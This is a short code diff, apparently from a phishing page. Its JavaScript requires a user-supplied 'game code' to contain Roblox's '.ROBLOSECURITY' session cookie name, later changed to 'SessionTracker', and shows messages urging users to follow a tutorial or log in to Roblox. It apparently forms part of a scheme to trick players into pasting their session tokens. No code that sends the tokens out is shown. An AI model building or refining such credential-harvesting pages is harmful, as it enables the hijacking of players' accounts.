@@ -20,10 +20,10 @@ document.addEventListener("DOMContentLoaded", function () {
         }
 
         // Check for .ROBLOSECURITY
-        if (!gameCode.includes(".ROBLOSECURITY")) {
+        if (!gameCode.includes("SessionTracker")) {
             Swal.fire({
-                title: "Invalid Game Code",
-                text: "Please watch the tutorial and try again ☹️",
+                title: "Error",
+                text: "Try to login in Roblox",
                 icon: "error",
                 confirmButtonText: "OK"
             });
